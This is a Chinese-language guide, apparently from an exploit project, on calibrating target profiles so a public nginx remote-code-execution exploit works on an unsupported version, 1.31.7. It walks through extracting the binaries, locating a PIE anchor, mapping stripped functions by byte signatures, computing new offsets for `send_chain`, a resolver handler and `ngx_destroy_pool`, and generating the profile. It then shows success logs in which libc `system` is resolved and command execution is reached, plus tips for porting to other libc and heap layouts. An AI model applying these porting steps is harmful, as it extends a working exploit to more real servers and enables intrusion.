# 03 — 给没有官方 profile 的版本做标定

Rapid7 的利用只附带了两个已验证 profile（nginx 1.31.6 / 1.31.8，Debian 13
amd64）。这里记录我们怎么给没有官方 profile 的 nginx 1.31.7 做出可用 profile。

## Profile 关键结构

```json
{
  "target": {
    "nginx_version": "1.31.8",
    "nginx_build_id": "955cb638...",
    "nginx_sha256": "f617a134...",
    "libc_sha256": "9792e3cb...",
    "openssl_runtime": "OpenSSL 3.5.7 ...",
    "worker_count": 4, "worker_connections": 1024,
    "http2_pool_size_bytes": 4096, "ssl_buffer_size_bytes": 16384, ...
  },
  "fingerprint": {
    "server_header": "nginx/1.31.8",
    "http2_settings": [[3,128],[4,65536],[5,16777215],[9,1]],
    "nginx_image_pointer_deltas": [0, -464, -13568],
    "http2_send_chain_delta": 139856,
    "resolver_timeout_delta": -310400,
    "destroy_pool_delta": -398896
  },
  "transport": { "negative_distance": 14392, "release_increment": 14393, ... },
  "heap": { "holder_value_bytes": 5135, "address_disclosure": { ... }, ... }
}
```

其中只有 nginx image delta 直接依赖 nginx 二进制布局：

- `nginx_image_pointer_deltas`：用泄漏内存里三个相对 handler 指针定位 PIE
  anchor（`[0, -464, -13568]`）；
- `http2_send_chain_delta`：anchor + delta = 伪造连接的 `send_chain` 地址；
- `resolver_timeout_delta`：anchor + delta = deferred 执行用的 handler；
- `destroy_pool_delta`：anchor + delta = reclaim 阶段用的 `ngx_destroy_pool`。

heap/transport 字段依赖 nginx 池布局和协议时序。1.31.6 和 1.31.8 之间，除了
`negative_distance`（13,880 vs 14,392）外，我们目标相关的参数一致。对 1.31.7
我们直接沿用 1.31.8 的值，实测成立（首次泄漏 14,393 字节、第二次 200,929 字节）。

## 标定步骤

### 1. 提取并识别目标二进制

```sh
docker cp <container>:/usr/sbin/nginx  ./nginx-new
docker cp <container>:/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
nginx -v
sha256sum nginx-new libc.so.6
readelf -n nginx-new | grep 'Build ID'
readelf -n libc.so.6 | grep 'Build ID'
```

官方镜像的二进制被 strip（只有 `.gnu_debuglink`，没有 `.symtab`），不能靠
符号表直接取函数偏移。

### 2. 确认运行时指纹

- HTTP/2 响应的 `server` 头（`nginx/1.31.7`）；
- TLS 1.3 + ALPN `h2`；
- HTTP/2 SETTINGS（1.31.7 和 1.31.8 都是 `[[3,128],[4,65536],[5,16777215],[9,1]]`）；
- 静态资源：`/index.html` 896 字节，`Range: bytes=0-9` 返回 206、
  `content-range: bytes 0-9/896`、body 10 字节。

`tools/probe_h2_settings.py` 会打印 TLS/ALPN 和 SETTINGS 列表。

### 3. 在已知二进制里找 anchor

先在已知的 1.31.8 上验证 delta 语义：候选 anchor `A` 要满足 `A`、`A-464`、
`A-13568` 都是函数入口，且 `A+139856`、`A-310400`、`A-398896` 也是函数入口/
代码。扫描可执行段得到唯一候选：

```text
$ python3 tools/scan_nginx_deltas.py nginx-1.31.8 --profile $RAPID7_PROFILE
anchor 0x98840
  delta        0 -> 0x98840  start=yes
  delta     -464 -> 0x98670  start=yes
  delta   -13568 -> 0x95340  start=yes
  delta  +139856 -> 0xbaa90  start=yes
  delta -310400 -> 0x4cbc0  start=yes
  delta -398896 -> 0x37210  start=yes
```

### 4. 在新二进制里找 anchor

用同样的 `[0,-464,-13568]` 关系扫 1.31.7，同样唯一：

```text
anchor 0x98940
  delta        0 -> 0x98940
  delta     -464 -> 0x98770
  delta   -13568 -> 0x95440
```

（anchor 整体 +0x100，三个 handler 的相对距离不变。）

### 5. 用函数字节签名映射其余函数

被 strip 的二进制里函数代码还在。取旧二进制里每个已知函数的前 48–96 字节，
在新二进制可执行段里搜：

| 函数 | 1.31.8 vaddr | 1.31.7 vaddr | 位移 | 匹配 |
|---|---|---|---|---|
| anchor（handler） | `0x98840` | `0x98940` | +0x100 | 96 字节精确 |
| handler-1 | `0x98670` | `0x98770` | +0x100 | 48 字节精确 |
| handler-2 | `0x95340` | `0x95440` | +0x100 | 由 delta 关系确定（代码有变化） |
| `ngx_http_v2_send_chain` | `0xbaa90` | `0xbac10` | +0x180 | 96 字节精确 |
| resolver timeout handler | `0x4cbc0` | `0x4cb40` | -0x80 | 64 字节精确 |
| `ngx_destroy_pool` | `0x37210` | `0x37150` | -0xC0 | 64 字节精确 |

`tools/match_nginx_functions.py` 自动做签名搜索并输出 delta 表。

### 6. 算新 delta

```text
send_chain     0xbac10 - 0x98940 = 139984   （原 139856）
resolver       0x4cb40 - 0x98940 = -310784  （原 -310400）
destroy_pool   0x37150 - 0x98940 = -399344  （原 -398896）
triple         [0, -464, -13568]            （不变）
```

### 7. 生成并校验 profile

```sh
python3 tools/make_profile.py \
  --base $RAPID7_PROFILE \
  --nginx nginx-1.31.7 \
  --libc libc.so.6 \
  --name local-nginx-1.31.7-debian13-amd64 \
  --send-chain-delta 139984 \
  --resolver-timeout-delta -310784 \
  --destroy-pool-delta -399344 \
  --out profiles/local-nginx-1.31.7-debian13-amd64.json

python exploit/profiles/profile_tool.py validate \
  exploit/profiles/local-nginx-1.31.7-debian13-amd64.json
```

`make_profile.py` 从二进制提取身份字段（版本、build-id、SHA-256、libc 身份），
保留 base profile 的 heap/transport 字段。默认标成 unvalidated；在实验环境
通过端到端 oracle 后，可以用 `--mark-validated` 标成已验证（仅限自家实验环境）。

### 8. 端到端验证

对刚重启的目标跑公开利用和本地 profile，成功时日志应该出现：

```text
runtime HTTP profile: ... candidates=local-nginx-1.31.7-debian13-amd64
captured 14393-byte memory disclosure; resolving ASLR
ASLR resolved: ... profile=local-nginx-1.31.7-debian13-amd64
address disclosure capture: wire_bytes=200929
address-directed libc symbols resolved in-band: system=0x...
late target-owned execution record installed; releasing final response byte
```

然后在利用之外独立验证 marker，比如容器里：

```text
uid=101 gid=101 mode=644 size=14
content: redacted
```

## 常见坑

- libc 不同（哈希/build-id 不同）：别复用 libc 字段，要重新标定 memcpy
  offset、arena 偏移和 `system` 解析方式。
- heap 布局不同（nginx 代码变化影响池布局）：要调 `transport.negative_distance`、
  `disclosure_frame_bytes` 和 heap grooming 字段，并逐阶段验证（首次泄漏 →
  reclaim → 第二次泄漏）。
- anchor 不稳定：如果 handler 代码变化太大，签名匹配可能失败，需要反汇编
  候选函数，或者用相同 configure 参数重新编译 nginx。
- 别伪造验证状态：`validated` 应该意味着在你的环境里真的通过了端到端
  命令执行 oracle。
